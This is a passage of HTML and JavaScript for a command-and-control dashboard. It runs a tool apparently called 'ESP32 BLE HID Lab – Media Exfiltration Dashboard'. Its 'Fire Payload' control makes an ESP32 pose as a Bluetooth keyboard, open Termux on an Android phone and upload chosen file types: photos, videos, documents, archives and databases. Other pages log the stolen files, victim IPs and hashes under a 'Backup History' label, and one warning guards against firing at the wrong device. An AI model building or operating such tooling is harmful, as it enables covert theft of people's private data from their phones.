<!-- ══ TOPBAR ═══════════════════════════════════════════════════════════════ -->
<div class="topbar">
  <div class="logo">
    <svg width="28" height="28" viewBox="0 0 28 28" fill="none">
      <rect width="28" height="28" rx="7" fill="#1a2340"/>
      <path d="M7 14h4l2-5 3 10 2-7 2 4h1" stroke="#4f8ef7" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round"/>
      <circle cx="21" cy="8" r="2.5" fill="#22d47a"/>
    </svg>
    <div>
      <div class="logo-text">ESP32 BLE HID Lab</div>
      <div class="logo-sub">Media Exfiltration Dashboard</div>
    </div>
  </div>
  <div class="topbar-nav" style="display:flex;gap:4px;margin-left:28px">
    <a href="#" onclick="showPage('overview',this)">Overview</a>
    <a href="#" onclick="showPage('history',this)" style="margin:0 2px">History</a>
    <a href="#" onclick="showPage('devices',this)">Devices</a>
    <a href="#" onclick="showPage('errors',this)">Errors</a>
  </div>
  <div class="topbar-right">
    <div class="status-pill">
      <span class="dot active" id="conn-dot"></span>
      <span id="conn-label">Connected</span>
    </div>
    <div class="uptime-badge">⏱ <span id="uptime">--:--:--</span></div>
    <div style="display:flex;gap:6px">
      <a href="/files" style="font-size:.75rem;padding:5px 11px;border-radius:6px;border:1px solid var(--border);background:var(--surface2);color:var(--muted)">Gallery</a>
      <a href="/report" style="font-size:.75rem;padding:5px 11px;border-radius:6px;border:1px solid var(--border);background:var(--surface2);color:var(--muted)">Report</a>
    </div>
  </div>
</div>

<!-- ══ BODY ══════════════════════════════════════════════════════════════════ -->
<div class="app-body">

<!-- ── SIDEBAR ─────────────────────────────────────────────────────────────── -->
<nav class="sidebar">
  <div class="sidebar-section">
    <div class="sidebar-label">Monitor</div>
    <div class="nav-item active" onclick="showPage('overview',this)" id="nav-overview">
      <svg class="icon" viewBox="0 0 16 16" fill="currentColor"><path d="M2 2h5v5H2zm7 0h5v5H9zM2 9h5v5H2zm7 0h5v5H9z"/></svg>
      Overview
    </div>
    <div class="nav-item" onclick="showPage('history',this)" id="nav-history">
      <svg class="icon" viewBox="0 0 16 16" fill="currentColor"><path d="M8 1a7 7 0 1 0 0 14A7 7 0 0 0 8 1zM7 4h2v5H7zm0 6h2v2H7z"/></svg>
      Backup History
      <span class="nav-badge" id="nb-hist">0</span>
    </div>
    <div class="nav-item" onclick="showPage('storage',this)" id="nav-storage">
      <svg class="icon" viewBox="0 0 16 16" fill="currentColor"><path d="M2 3h12a1 1 0 0 1 1 1v2a1 1 0 0 1-1 1H2a1 1 0 0 1-1-1V4a1 1 0 0 1 1-1zm0 6h12a1 1 0 0 1 1 1v2a1 1 0 0 1-1 1H2a1 1 0 0 1-1-1v-2a1 1 0 0 1 1-1z"/></svg>
      Storage
    </div>
    <div class="nav-item" onclick="showPage('devices',this)" id="nav-devices">
      <svg class="icon" viewBox="0 0 16 16" fill="currentColor"><path d="M11 2a2 2 0 0 1 2 2v8a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h6zm-2 9a1 1 0 1 0-2 0 1 1 0 0 0 2 0z"/></svg>
      Devices
      <span class="nav-badge" id="nb-dev">0</span>
    </div>
  </div>
  <hr class="sidebar-divider">
  <div class="sidebar-section">
    <div class="sidebar-label">Control</div>
    <div class="nav-item" onclick="showPage('control',this)" id="nav-control">
      <svg class="icon" viewBox="0 0 16 16" fill="currentColor"><path d="M8 1a7 7 0 1 0 0 14A7 7 0 0 0 8 1zm0 2a5 5 0 1 1 0 10A5 5 0 0 1 8 3zm0 2a3 3 0 1 0 0 6 3 3 0 0 0 0-6zm0 1.5a1.5 1.5 0 1 1 0 3 1.5 1.5 0 0 1 0-3z"/></svg>
      Remote Trigger
      <span class="nav-badge" id="nb-ctrl" style="display:none">●</span>
    </div>
  </div>
  <hr class="sidebar-divider">
  <div class="sidebar-section">
    <div class="sidebar-label">Alerts</div>
    <div class="nav-item" onclick="showPage('errors',this)" id="nav-errors">
      <svg class="icon" viewBox="0 0 16 16" fill="currentColor"><path d="M8 1L0 15h16L8 1zm1 10H7V9h2v2zm0-4H7V5h2v2z"/></svg>
      Errors
      <span class="nav-badge red" id="nb-err">0</span>
    </div>
  </div>
</nav>

<!-- ── MAIN ─────────────────────────────────────────────────────────────────── -->
<main class="main">

  <!-- ════ OVERVIEW ════════════════════════════════════════════════════════ -->
  <div class="page active" id="page-overview">
    <div class="section-header">
      <div>
        <div class="section-title">Overview</div>
        <div class="section-sub">Live server metrics — auto-refreshes every 3 s</div>
      </div>
      <div class="refresh-tag">
        <svg width="10" height="10" viewBox="0 0 10 10" fill="none"><circle cx="5" cy="5" r="4" stroke="#4b5680" stroke-width="1.5"/><path d="M5 2v3l2 1" stroke="#4b5680" stroke-width="1.2" stroke-linecap="round"/></svg>
        Live
      </div>
    </div>

    <!-- KPIs -->
    <div class="kpi-grid">
      <div class="kpi blue">
        <div class="kpi-label">Total Files</div>
        <div class="kpi-val" id="k-files">—</div>
        <div class="kpi-sub">received this session</div>
        <div class="kpi-icon">📁</div>
      </div>
      <div class="kpi green">
        <div class="kpi-label">Storage Used</div>
        <div class="kpi-val" id="k-mb">—</div>
        <div class="kpi-sub">MB across all categories</div>
        <div class="kpi-icon">💾</div>
      </div>
      <div class="kpi amber">
        <div class="kpi-label">Upload Speed</div>
        <div class="kpi-val" id="k-speed">0</div>
        <div class="kpi-sub">KB/s · last 10 seconds</div>
        <div class="kpi-icon">⚡</div>
      </div>
      <div class="kpi" id="k-err-kpi">
        <div class="kpi-label">Errors</div>
        <div class="kpi-val" id="k-errors">0</div>
        <div class="kpi-sub">total upload failures</div>
        <div class="kpi-icon">⚠</div>
      </div>
    </div>

    <!-- Speed + Donut row -->
    <div class="row2">
      <!-- speed card -->
      <div class="card">
        <div class="card-title">Upload Speed</div>
        <div class="speed-num" id="sp-num">0 <span style="font-size:1rem;color:var(--muted)">KB/s</span></div>
        <div class="speed-unit">Average over last 10 seconds</div>
        <div id="sp-status" class="speed-status idle">Idle</div>
        <div class="sparkline" id="sparkline-wrap">
          <svg id="sparkline-svg" height="52" viewBox="0 0 400 52" preserveAspectRatio="none">
            <path id="spark-path" d="" fill="none" stroke="#4f8ef7" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
            <path id="spark-fill" d="" fill="url(#spark-grad)" opacity=".25"/>
            <defs>
              <linearGradient id="spark-grad" x1="0" y1="0" x2="0" y2="1">
                <stop offset="0%" stop-color="#4f8ef7"/>
                <stop offset="100%" stop-color="#4f8ef7" stop-opacity="0"/>
              </linearGradient>
            </defs>
          </svg>
        </div>
        <div style="display:flex;justify-content:space-between;font-size:.68rem;color:var(--muted);margin-top:2px">
          <span>60 s ago</span><span>now</span>
        </div>
      </div>

      <!-- storage donut -->
      <div class="card">
        <div class="card-title">Storage by Category</div>
        <div class="donut-wrap">
          <svg id="donut-svg" width="100" height="100" viewBox="0 0 36 36">
            <circle cx="18" cy="18" r="15.9" fill="none" stroke="var(--surface2)" stroke-width="4"/>
            <g id="donut-arcs"></g>
            <text x="18" y="19" text-anchor="middle" font-size="5" fill="#f1f5f9" font-weight="600" id="donut-center">0 MB</text>
          </svg>
          <div class="donut-legend" id="donut-legend"></div>
        </div>
      </div>
    </div>

    <!-- Category bars -->
    <div class="card" style="margin-bottom:12px">
      <div class="card-title">Category Breakdown</div>
      <div id="cat-progs"></div>
    </div>

    <!-- Mini history -->
    <div class="card">
      <div class="card-title" style="justify-content:space-between">
        <span>Recent Uploads</span>
        <a href="#" onclick="showPage('history')" style="font-size:.72rem">View all →</a>
      </div>
      <div class="table-wrap" style="max-height:200px">
        <table>
          <thead><tr><th>Time</th><th>File</th><th>Category</th><th>Size</th><th>Status</th></tr></thead>
          <tbody id="mini-hist"></tbody>
        </table>
      </div>
    </div>
  </div>

  <!-- ════ HISTORY ═════════════════════════════════════════════════════════ -->
  <div class="page" id="page-history">
    <div class="section-header">
      <div><div class="section-title">Backup History</div><div class="section-sub">All upload events this session (last 200)</div></div>
    </div>
    <div class="card">
      <div class="card-title" style="justify-content:space-between">
        <span>Upload Log</span>
        <span id="hist-total" style="color:var(--muted);font-size:.72rem;text-transform:none;letter-spacing:0"></span>
      </div>
      <div class="table-wrap">
        <table>
          <thead><tr><th>Time</th><th>Filename</th><th>Category</th><th>Size (KB)</th><th>IP Address</th><th>SHA-256</th><th>Status</th></tr></thead>
          <tbody id="hist-body"></tbody>
        </table>
      </div>
    </div>
  </div>

  <!-- ════ STORAGE ═════════════════════════════════════════════════════════ -->
  <div class="page" id="page-storage">
    <div class="section-header">
      <div><div class="section-title">Storage Utilization</div><div class="section-sub">Files stored on disk by category</div></div>
    </div>
    <div class="kpi-grid" style="grid-template-columns:repeat(3,1fr)">
      <div class="kpi blue"><div class="kpi-label">Total Files</div><div class="kpi-val" id="st-files">—</div></div>
      <div class="kpi green"><div class="kpi-label">Total Size</div><div class="kpi-val" id="st-mb">—</div><div class="kpi-sub">MB</div></div>
      <div class="kpi amber"><div class="kpi-label">Unique Hashes</div><div class="kpi-val" id="st-hashes">—</div></div>
    </div>
    <div class="card">
      <div class="card-title">Disk Usage per Category</div>
      <div id="st-bars"></div>
    </div>
  </div>

  <!-- ════ DEVICES ═════════════════════════════════════════════════════════ -->
  <div class="page" id="page-devices">
    <div class="section-header">
      <div><div class="section-title">Connected Devices</div><div class="section-sub">Devices that have uploaded files this session</div></div>
    </div>
    <div id="dev-grid" class="dev-grid">
      <div class="empty"><svg width="40" height="40" viewBox="0 0 40 40" fill="none"><rect x="8" y="6" width="24" height="28" rx="3" stroke="#4b5680" stroke-width="1.5"/><circle cx="20" cy="30" r="1.5" fill="#4b5680"/></svg>No uploads yet.</div>
    </div>
  </div>

  <!-- ════ CONTROL / REMOTE TRIGGER ═══════════════════════════════════════ -->
  <div class="page" id="page-control">
    <div class="section-header">
      <div><div class="section-title">Remote Trigger</div>
      <div class="section-sub">Fire payload from the web — no physical button needed</div></div>
    </div>

    <!-- ESP32 status banner -->
    <div id="ctrl-status-banner" style="display:flex;align-items:center;gap:12px;padding:14px 18px;border-radius:10px;border:1px solid var(--border);background:var(--surface);margin-bottom:16px">
      <div id="ctrl-dot" style="width:10px;height:10px;border-radius:50%;background:var(--muted);flex-shrink:0"></div>
      <div>
        <div id="ctrl-status-text" style="font-size:.85rem;font-weight:600;color:#f1f5f9">ESP32 — checking...</div>
        <div id="ctrl-status-sub" style="font-size:.72rem;color:var(--muted);margin-top:2px">Waiting for heartbeat from ESP32</div>
      </div>
      <div style="margin-left:auto;font-size:.72rem;color:var(--muted)" id="ctrl-last-seen"></div>
    </div>

    <!-- BLE / Android connection status banner -->
    <div id="ble-status-row" style="display:none;align-items:center;gap:12px;padding:11px 18px;border-radius:10px;border:1px solid var(--border);background:var(--surface);margin-bottom:8px">
      <div id="ble-dot" style="width:10px;height:10px;border-radius:50%;background:var(--muted);flex-shrink:0"></div>
      <div id="ble-status-text" style="font-size:.82rem;font-weight:600;color:var(--muted)">Android — waiting...</div>
    </div>

    <!-- USB / Serial host connection status banner -->
    <div id="usb-status-row" style="display:none;align-items:center;gap:12px;padding:11px 18px;border-radius:10px;border:1px solid var(--border);background:var(--surface);margin-bottom:8px">
      <div id="usb-dot" style="width:10px;height:10px;border-radius:50%;background:var(--muted);flex-shrink:0"></div>
      <div>
        <div id="usb-status-text" style="font-size:.82rem;font-weight:600;color:var(--muted)">Host USB — waiting...</div>
        <div id="usb-status-sub" style="font-size:.7rem;color:var(--muted);margin-top:1px"></div>
      </div>
    </div>

    <!-- Wrong-target warning: USB connected but BLE not — keystrokes would hit host -->
    <div id="wrong-target-warn" style="display:none;padding:10px 14px;border-radius:8px;background:rgba(239,68,68,.08);border:1px solid rgba(239,68,68,.3);font-size:.78rem;color:#f87171;margin-bottom:16px;line-height:1.6">
      ⚠️ <strong>Wrong-target risk:</strong> ESP32 is connected to your computer via USB but Android BLE is <strong>not</strong> connected.
      Firing a payload now would type keystrokes into your computer instead of the Android device.
      <br>Pair the ESP32 as <strong>"ESP32 Keyboard"</strong> on your Android phone first, or disconnect the USB cable.
      The firmware will also refuse to fire in this state.
    </div>

    <div style="display:grid;grid-template-columns:1fr 1fr;gap:16px">

      <!-- File type selector -->
      <div class="card">
        <div class="card-title">File Types to Collect</div>
        <div style="display:flex;flex-wrap:wrap;gap:8px;margin-bottom:16px" id="ext-grid">
          <!-- populated by JS -->
        </div>
        <div style="display:flex;gap:8px;margin-top:4px">
          <button onclick="selectAllExts(true)"  style="padding:4px 12px;border-radius:5px;border:1px solid var(--border);background:var(--surface2);color:var(--muted);font-size:.72rem;cursor:pointer">Select all</button>
          <button onclick="selectAllExts(false)" style="padding:4px 12px;border-radius:5px;border:1px solid var(--border);background:var(--surface2);color:var(--muted);font-size:.72rem;cursor:pointer">Clear all</button>
          <button onclick="saveExtConfig()"      style="padding:4px 14px;border-radius:5px;border:1px solid rgba(79,142,247,.4);background:rgba(79,142,247,.12);color:var(--accent);font-size:.72rem;cursor:pointer;margin-left:auto">Save config</button>
        </div>
      </div>

      <!-- Trigger panel -->
      <div class="card" style="display:flex;flex-direction:column;gap:14px">
        <div class="card-title">Launch Payload</div>
        <div style="font-size:.8rem;color:var(--muted);line-height:1.6">
          Queues a payload command. The ESP32 picks it up on its next poll cycle (≤ 2 s), opens Termux on the target device, and starts the upload.
        </div>
        <div id="ctrl-pending-warn" style="display:none;padding:8px 12px;border-radius:7px;background:rgba(245,166,35,.08);border:1px solid rgba(245,166,35,.25);font-size:.75rem;color:#f5a623;display:flex;align-items:center;gap:10px">
          <span>⏳ A command is already queued — waiting for ESP32 to pick it up.</span>
          <button onclick="cancelTrigger()" style="margin-left:auto;padding:3px 10px;border-radius:5px;border:1px solid rgba(245,166,35,.4);background:rgba(245,166,35,.12);color:#f5a623;font-size:.7rem;cursor:pointer;flex-shrink:0">✕ Cancel</button>
        </div>
        <button id="trigger-btn" onclick="fireTrigger()"
          style="width:100%;padding:14px;border-radius:8px;border:none;cursor:pointer;
                 font-size:.9rem;font-weight:600;letter-spacing:.03em;
                 background:linear-gradient(135deg,#4f8ef7,#7c5cd8);color:#fff;
                 transition:opacity .15s;position:relative;overflow:hidden">
          🚀  Fire Payload
        </button>
        <div id="trigger-result" style="font-size:.75rem;text-align:center;min-height:18px"></div>

        <!-- Trigger log -->
        <div style="margin-top:4px">
          <div style="font-size:.7rem;color:var(--muted);margin-bottom:6px;text-transform:uppercase;letter-spacing:.06em">Trigger Log</div>
          <div id="trigger-log" style="font-size:.72rem;color:var(--muted);max-height:120px;overflow-y:auto;display:flex;flex-direction:column;gap:4px">
            <div style="color:var(--muted)">No triggers fired yet.</div>
          </div>
        </div>
      </div>

    </div>
  </div>

  <!-- ════ ERRORS ══════════════════════════════════════════════════════════ -->
  <div class="page" id="page-errors">
    <div class="section-header">
      <div><div class="section-title">Error Monitoring</div><div class="section-sub">Failed upload events</div></div>
    </div>
    <div class="card">
      <div class="card-title">Error Feed <span id="err-count-label" style="color:var(--red);font-weight:400;text-transform:none;letter-spacing:0"></span></div>
      <div class="err-feed" id="err-feed">
        <div class="empty" style="padding:24px">
          <svg width="36" height="36" viewBox="0 0 36 36" fill="none"><path d="M18 4L2 32h32L18 4z" stroke="#4b5680" stroke-width="1.5"/><path d="M18 14v8M18 26v2" stroke="#4b5680" stroke-width="1.5" stroke-linecap="round"/></svg>
          No errors recorded.
        </div>
      </div>
    </div>
  </div>

</main>
</div><!-- /.app-body -->

<script>
// ── constants ────────────────────────────────────────────────────────────────
const CAT_COL = {DCIM:'#4f8ef7',Pictures:'#9f7aea',Screenshots:'#22d3ee',Movies:'#f5a623',Downloads:'#22d47a',Other:'#64748b'};
const DONUT_R = 15.9, DONUT_CIRC = 2 * Math.PI * DONUT_R;

// ── state ────────────────────────────────────────────────────────────────────
let _sp = [], _maxSp = 1, _activePage = 'overview', _lastData = null;

// ── page routing ─────────────────────────────────────────────────────────────
function showPage(id, el) {
  document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
  document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
  document.querySelectorAll('.topbar-nav a').forEach(a => a.style.fontWeight = '');
  document.getElementById('page-' + id).classList.add('active');
  const ni = document.getElementById('nav-' + id);
  if (ni) ni.classList.add('active');
  if (el && el.style !== undefined) el.style.fontWeight = '600';
  _activePage = id;
  return false;
}

// ── poll ─────────────────────────────────────────────────────────────────────
async function poll() {
  try {
    const r = await fetch('/api/stats');
    if (!r.ok) throw 0;
    _lastData = await r.json();
    render(_lastData);
    setConn(true);
  } catch {
    setConn(false);
  }
}

function setConn(ok) {
  const dot = document.getElementById('conn-dot');
  const lbl = document.getElementById('conn-label');
  dot.className = 'dot' + (ok ? ' active' : ' red');
  lbl.textContent = ok ? 'Server Online' : 'Server Offline';
  dot.style.background = ok ? 'var(--green)' : 'var(--red)';
}

// ── render ───────────────────────────────────────────────────────────────────
function render(d) {
  document.getElementById('uptime').textContent = d.uptime;

  // badges
  document.getElementById('nb-hist').textContent = d.history ? d.history.length : 0;
  document.getElementById('nb-dev').textContent  = d.devices ? d.devices.length : 0;
  const ec = (d.history||[]).filter(h=>!h.ok).length;
  document.getElementById('nb-err').textContent = ec;

  // ── KPIs
  document.getElementById('k-files').textContent  = d.total_files;
  document.getElementById('k-mb').textContent     = d.total_mb;
  document.getElementById('k-speed').textContent  = d.speed_kbps;
  document.getElementById('k-errors').textContent = d.error_count;
  const ekpi = document.getElementById('k-err-kpi');
  ekpi.className = 'kpi ' + (d.error_count > 0 ? 'red' : 'green');

  // ── speed panel
  const sp = d.speed_kbps;
  document.getElementById('sp-num').innerHTML = sp + ' <span style="font-size:1rem;color:var(--muted)">KB/s</span>';
  const ss = document.getElementById('sp-status');
  if (sp > 0) { ss.className='speed-status active'; ss.textContent='● Uploading'; }
  else { ss.className='speed-status idle'; ss.textContent='Idle'; }
  _sp.push(sp); if (_sp.length > 40) _sp.shift();
  _maxSp = Math.max(..._sp, 1);
  renderSparkline();

  // ── donut
  renderDonut(d.categories);

  // ── category bars (overview)
  renderCatBars('cat-progs', d.categories, false);

  // ── mini history
  renderMiniHist(d.history || []);

  // ── full history page
  renderFullHist(d.history || []);

  // ── storage page
  document.getElementById('st-files').textContent  = d.total_files;
  document.getElementById('st-mb').textContent     = d.total_mb;
  document.getElementById('st-hashes').textContent = d.known_hashes;
  renderCatBars('st-bars', d.categories, true);

  // ── devices page
  renderDevices(d.devices || []);

  // ── errors page
  renderErrors((d.history||[]).filter(h=>!h.ok));

  // ── control panel
  updateControlPanel(d);
}

// ── sparkline ────────────────────────────────────────────────────────────────
function renderSparkline() {
  const W = 400, H = 48;
  const pts = _sp;
  if (pts.length < 2) return;
  const step = W / (pts.length - 1);
  const coords = pts.map((v, i) => [i * step, H - 4 - (v / _maxSp) * (H - 8)]);
  const line = coords.map((p, i) => (i === 0 ? 'M' : 'L') + p[0].toFixed(1) + ' ' + p[1].toFixed(1)).join(' ');
  const fill = line + ' L' + coords[coords.length-1][0].toFixed(1) + ' ' + H + ' L0 ' + H + ' Z';
  document.getElementById('spark-path').setAttribute('d', line);
  document.getElementById('spark-fill').setAttribute('d', fill);
}

// ── donut ─────────────────────────────────────────────────────────────────────
function renderDonut(cats) {
  const totalMb = Object.values(cats).reduce((s,c) => s + c.size_mb, 0);
  document.getElementById('donut-center').textContent = totalMb.toFixed(1) + ' MB';
  const arcsEl = document.getElementById('donut-arcs');
  const legEl  = document.getElementById('donut-legend');
  if (totalMb === 0) { arcsEl.innerHTML=''; legEl.innerHTML='<div style="font-size:.72rem;color:var(--muted)">No data yet</div>'; return; }
  let offset = 0;
  const svgNS = 'http://www.w3.org/2000/svg';
  arcsEl.innerHTML = '';
  legEl.innerHTML  = '';
  Object.entries(cats).filter(([,c])=>c.size_mb>0).forEach(([name, c]) => {
    const frac = c.size_mb / totalMb;
    const dash = frac * DONUT_CIRC;
    const gap  = DONUT_CIRC - dash;
    const col  = CAT_COL[name] || '#64748b';
    const circle = document.createElementNS(svgNS, 'circle');
    circle.setAttribute('cx','18'); circle.setAttribute('cy','18');
    circle.setAttribute('r', DONUT_R);
    circle.setAttribute('fill','none');
    circle.setAttribute('stroke', col);
    circle.setAttribute('stroke-width','4');
    circle.setAttribute('stroke-dasharray', dash.toFixed(2) + ' ' + gap.toFixed(2));
    circle.setAttribute('stroke-dashoffset', (-offset * DONUT_CIRC).toFixed(2));
    circle.setAttribute('transform','rotate(-90 18 18)');
    arcsEl.appendChild(circle);
    offset += frac;
    legEl.innerHTML += '<div class="leg-row"><div class="leg-dot" style="background:'+col+'"></div>'+name+'<span class="leg-val">'+c.size_mb+' MB</span></div>';
  });
}

// ── category progress bars ────────────────────────────────────────────────────
function renderCatBars(elId, cats, showCount) {
  const maxMb = Math.max(...Object.values(cats).map(c=>c.size_mb), 0.001);
  const el = document.getElementById(elId);
  el.innerHTML = Object.entries(cats).map(([name,c]) => {
    const pct = Math.min(100, (c.size_mb / maxMb) * 100);
    const col = CAT_COL[name] || '#64748b';
    const meta = showCount ? c.count + ' files · ' + c.size_mb + ' MB' : c.count + ' files';
    return '<div class="prog-row">' +
      '<span class="prog-label">'+name+'</span>' +
      '<div class="prog-track"><div class="prog-fill" style="width:'+pct+'%;background:'+col+'"></div></div>' +
      '<span class="prog-meta">'+meta+'</span>' +
    '</div>';
  }).join('');
}

// ── mini history ──────────────────────────────────────────────────────────────
function renderMiniHist(hist) {
  const el = document.getElementById('mini-hist');
  if (!hist.length) { el.innerHTML='<tr><td colspan="5" style="text-align:center;color:var(--muted);padding:20px">No uploads yet.</td></tr>'; return; }
  el.innerHTML = hist.slice(0,10).map(h =>
    '<tr><td>'+h.ts+'</td>' +
    '<td title="'+h.filename+'">'+h.filename.slice(0,24)+(h.filename.length>24?'…':'')+'</td>' +
    '<td><span class="badge cat">'+h.category+'</span></td>' +
    '<td>'+h.size_kb+' KB</td>' +
    '<td><span class="badge '+(h.ok?'ok':'fail')+'">'+(h.ok?'OK':'FAIL')+'</span></td></tr>'
  ).join('');
}

// ── full history ───────────────────────────────────────────────────────────────
function renderFullHist(hist) {
  document.getElementById('hist-total').textContent = hist.length + ' records';
  const el = document.getElementById('hist-body');
  if (!hist.length) { el.innerHTML='<tr><td colspan="7" style="text-align:center;color:var(--muted);padding:24px">No uploads yet.</td></tr>'; return; }
  el.innerHTML = hist.map(h =>
    '<tr><td>'+h.ts+'</td>' +
    '<td title="'+h.filename+'">'+h.filename.slice(0,32)+(h.filename.length>32?'…':'')+'</td>' +
    '<td><span class="badge cat">'+h.category+'</span></td>' +
    '<td>'+h.size_kb+'</td>' +
    '<td style="font-family:monospace;font-size:.7rem">'+h.ip+'</td>' +
    '<td style="font-family:monospace;font-size:.65rem;color:var(--muted)">'+h.sha256_prefix+'</td>' +
    '<td><span class="badge '+(h.ok?'ok':'fail')+'">'+(h.ok?'OK':'FAIL')+'</span></td></tr>'
  ).join('');
}

// ── devices ────────────────────────────────────────────────────────────────────
function renderDevices(devs) {
  const el = document.getElementById('dev-grid');
  if (!devs.length) {
    el.innerHTML = '<div class="empty"><svg width="40" height="40" viewBox="0 0 40 40" fill="none"><rect x="8" y="6" width="24" height="28" rx="3" stroke="#4b5680" stroke-width="1.5"/><circle cx="20" cy="30" r="1.5" fill="#4b5680"/></svg>No uploads yet.</div>';
    return;
  }
  el.innerHTML = devs.map(dv => {
    const mb = (dv.bytes/1048576).toFixed(2);
    return '<div class="dev-card">' +
      '<div class="dev-ip">'+dv.ip+'</div>' +
      '<div class="dev-stat-row"><span class="dk">Files</span><span class="dv">'+dv.files+'</span></div>' +
      '<div class="dev-stat-row"><span class="dk">Data</span><span class="dv">'+mb+' MB</span></div>' +
      '<div class="dev-stat-row"><span class="dk">Errors</span><span class="dv" style="color:'+(dv.errors>0?'var(--red)':'inherit')+'">'+dv.errors+'</span></div>' +
      '<div class="dev-stat-row"><span class="dk">First seen</span><span class="dv">'+dv.first_seen.slice(11,19)+'</span></div>' +
      '<div class="dev-stat-row"><span class="dk">Last seen</span><span class="dv">'+dv.last_seen.slice(11,19)+'</span></div>' +
    '</div>';
  }).join('');
}

// ── errors ─────────────────────────────────────────────────────────────────────
function renderErrors(errs) {
  document.getElementById('err-count-label').textContent = errs.length ? '(' + errs.length + ' failures)' : '';
  const el = document.getElementById('err-feed');
  if (!errs.length) {
    el.innerHTML = '<div class="empty" style="padding:24px"><svg width="36" height="36" viewBox="0 0 36 36" fill="none"><path d="M18 4L2 32h32L18 4z" stroke="#4b5680" stroke-width="1.5"/><path d="M18 14v8M18 26v2" stroke="#4b5680" stroke-width="1.5" stroke-linecap="round"/></svg>No errors recorded.</div>';
    return;
  }
  el.innerHTML = errs.map(e =>
    '<div class="err-item">' +
      '<div class="err-top"><span class="err-time">'+e.ts+'</span><span class="err-file">'+e.filename+'</span></div>' +
      '<div class="err-msg">'+(e.error||'Unknown error')+'</div>' +
    '</div>'
  ).join('');
}

// ── control panel ─────────────────────────────────────────────────────────────

const ALL_EXTS = [
  {g:'Images',  exts:['jpg','jpeg','png','webp','heic','gif','bmp','tiff','raw','dng']},
  {g:'Videos',  exts:['mp4','mov','mkv','avi','3gp','m4v','webm']},
  {g:'Docs',    exts:['pdf','txt','doc','docx','xls','xlsx','ppt','pptx','csv']},
  {g:'Archives',exts:['zip','rar','tar','gz','7z']},
  {g:'Other',   exts:['apk','db','json','xml','log']},
];
let _selExts = new Set(['jpg','jpeg','png','webp','heic','gif','mp4','mov','mkv','avi','3gp','pdf','txt','doc','docx','zip']);
let _triggerLog = [];
let _extGridBuilt = false;

function buildExtGrid(activeExts) {
  if (_extGridBuilt) return;
  _extGridBuilt = true;
  if (activeExts) _selExts = new Set(activeExts);
  const el = document.getElementById('ext-grid');
  let html = '';
  ALL_EXTS.forEach(group => {
    html += '<div style="width:100%;font-size:.68rem;font-weight:600;color:var(--muted);text-transform:uppercase;letter-spacing:.06em;margin:6px 0 4px">' + group.g + '</div>';
    group.exts.forEach(ext => {
      const on = _selExts.has(ext);
      html += '<div class="ext-chip' + (on ? ' on' : '') + '" data-ext="' + ext + '" onclick="toggleExt(this)">'
            + '.' + ext + '</div>';
    });
  });
  el.innerHTML = html;
}

function toggleExt(el) {
  const ext = el.dataset.ext;
  if (_selExts.has(ext)) { _selExts.delete(ext); el.classList.remove('on'); }
  else                    { _selExts.add(ext);    el.classList.add('on'); }
}
function selectAllExts(all) {
  _selExts = new Set();
  document.querySelectorAll('.ext-chip').forEach(c => {
    if (all) { _selExts.add(c.dataset.ext); c.classList.add('on'); }
    else c.classList.remove('on');
  });
}
async function saveExtConfig() {
  const token = document.cookie.split(';').map(c=>c.trim()).find(c=>c.startsWith('tok='));
  const headers = {'Content-Type':'application/json'};
  if (token) headers['X-Backup-Token'] = token.split('=')[1];
  const r = await fetch('/api/config', {method:'POST', headers, body: JSON.stringify({exts:[..._selExts]})});
  const d = await r.json();
  setResult('Config saved — ' + d.exts.length + ' types active', '#22d47a');
}

async function fireTrigger() {
  const btn = document.getElementById('trigger-btn');
  btn.disabled = true; btn.style.opacity = '.6';
  const exts = [..._selExts];
  if (!exts.length) {
    setResult('Select at least one file type first.', 'var(--red)');
    btn.disabled = false; btn.style.opacity = '1'; return;
  }
  try {
    const r = await fetch('/trigger', {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({exts})
    });
    if (r.status === 401) {
      setResult('Auth error — set UPLOAD_TOKEN in .env', 'var(--red)');
      btn.disabled = false; btn.style.opacity = '1'; return;
    }
    const d = await r.json();
    if (d.ok) {
      setResult('✓ Queued — ESP32 picks it up within 2 s', 'var(--green)');
      const ts = new Date().toLocaleTimeString();
      const esp32State = (_lastData && _lastData.esp32_online) ? 'ESP32 online' : 'ESP32 offline — will fire when it connects';
      _triggerLog.unshift(
        '<div style="display:flex;gap:8px;align-items:baseline">' +
        '<span style="color:var(--green);font-weight:600">' + ts + '</span>' +
        '<span style="color:#f1f5f9">' + exts.length + ' types</span>' +
        '<span style="color:var(--muted);font-size:.68rem">' + esp32State + '</span>' +
        '</div>'
      );
      if (_triggerLog.length > 20) _triggerLog.pop();
      document.getElementById('trigger-log').innerHTML = _triggerLog.join('');
    } else {
      setResult('Error: ' + JSON.stringify(d), 'var(--red)');
    }
  } catch(e) {
    setResult('Request failed — is the server running?', 'var(--red)');
  }
  setTimeout(() => { btn.disabled = false; btn.style.opacity = '1'; }, 2000);
}

function setResult(msg, col) {
  const el = document.getElementById('trigger-result');
  el.style.color = col; el.textContent = msg;
  setTimeout(() => { el.textContent = ''; }, 7000);
}

async function cancelTrigger() {
  try {
    const headers = {'Content-Type':'application/json'};
    const token = document.cookie.split(';').map(c=>c.trim()).find(c=>c.startsWith('tok='));
    if (token) headers['X-Backup-Token'] = token.split('=')[1];
    const r = await fetch('/api/cancel', {method:'POST', headers});
    const d = await r.json();
    if (d.ok) setResult('✓ Queued command cancelled', 'var(--amber)');
  } catch(e) {
    setResult('Cancel failed', 'var(--red)');
  }
}

function updateControlPanel(d) {
  const online    = d.esp32_online;
  const bleConn   = d.ble_connected;
  const usbConn   = d.usb_connected;

  // ── ESP32 WiFi / polling status ────────────────────────────────────────
  const dot = document.getElementById('ctrl-dot');
  const txt = document.getElementById('ctrl-status-text');
  const sub = document.getElementById('ctrl-status-sub');
  const ls  = document.getElementById('ctrl-last-seen');
  if (online) {
    dot.style.background = 'var(--green)';
    txt.textContent = 'ESP32 — Online';
    sub.textContent = 'Polling every 2 s — ready to receive commands';
    ls.textContent  = 'Last seen ' + d.esp32_age_s + ' s ago';
  } else if (d.esp32_age_s !== null) {
    dot.style.background = 'var(--amber)';
    txt.textContent = 'ESP32 — Not responding';
    sub.textContent = 'No poll in ' + d.esp32_age_s + ' s — is the ESP32 powered and on WiFi?';
